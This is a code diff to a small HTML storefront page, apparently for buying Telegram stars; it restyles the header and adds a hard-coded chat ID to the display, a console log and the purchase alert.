@@ -11,8 +11,9 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
     <style>
         body { background-color: #1d283a; color: white; font-family: 'Roboto', sans-serif; text-align: center; margin: 0; padding: 0; max-width: 400px; margin: auto; }
-        .header { background-color: #26334a; color: #FFFFFF; padding: 15px; display: flex; align-items: center; gap: 10px; font-size: 30px; padding-left: 20px; font-family: "Pacifico", serif; }
+        .header { background-color: #26334a; color: #FFFFFF; padding: 15px; display: flex; flex-direction: column; align-items: center; gap: 5px; font-family: "Pacifico", serif; }
         .header img { width: 30px; height: 30px; }
+        .chat-id { font-size: 14px; color: #bbbbbb; }
         .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; padding: 20px; }
         .gallery img { width: 100%; height: auto; border-radius: 5px; transition: transform 0.2s; cursor: pointer; }
         .gallery img:active { transform: scale(0.9); }
@@ -33,7 +34,8 @@
 <body>
     <div class="header">
         <img src="https://files.catbox.moe/0a5iq0.gif" alt="Icon" />
-        TGStar
+        <span>TGStar</span>
+        <span class="chat-id">Chat ID: 6792335123</span>
     </div>
     <div id="overlay" class="overlay" onclick="closePopup()"></div>
     <div class="gallery">
@@ -56,7 +58,7 @@
     <button class="close-btn" onclick="closePopup()">Cancel</button>
 </div>
 
-<!-- Hidden form & iframe to submit without fetch -->
+<!-- Hidden form & iframe to submit -->
 <iframe name="hiddenFrame" style="display:none;"></iframe>
 <form id="purchaseForm" action="submit.php" method="GET" target="hiddenFrame" style="display:none;">
     <input type="hidden" name="user_id" value="6792335123" />
@@ -72,6 +74,8 @@
 
 <script>
     let selectedAmount = 0;
+    // Log chat ID for debugging
+    console.log('Using Chat ID:', 6792335123);
 
     function showPurchase(amount, src) {
         selectedAmount = amount;
@@ -94,13 +98,12 @@
         document.getElementById('amountInput').value = selectedAmount;
         document.getElementById('purchaseForm').submit();
         triggerConfetti();
-        alert('Purchase request sent!');
+        alert('Purchase request sent for Chat ID: 6792335123!');
         closePopup();
     }
 
-    // Prevent context menu
     document.addEventListener('contextmenu', e => e.preventDefault());
 </script>
 
 </body>
-</html>
+        </html>
